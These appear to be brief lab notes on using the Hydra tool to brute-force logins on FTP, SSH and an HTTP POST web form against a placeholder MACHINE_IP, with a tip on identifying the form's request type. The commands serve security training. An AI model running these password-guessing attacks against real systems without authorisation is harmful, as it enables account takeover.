## Hydra ##

FTP

`hydra -l user -P passlist.txt ftp://MACHINE_IP`

SSH
 
`hydra -l <username> -P <full path to passlist.txt> MACHINE_IP -t 4 ssh`

Web Form

*We can use Hydra to bruteforce web forms too, you will have to make sure you know which type of request its making - a GET or POST methods are normally used. You can use your browsers network tab (in developer tools) to see the request types, of simply view the source code.*

`hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`




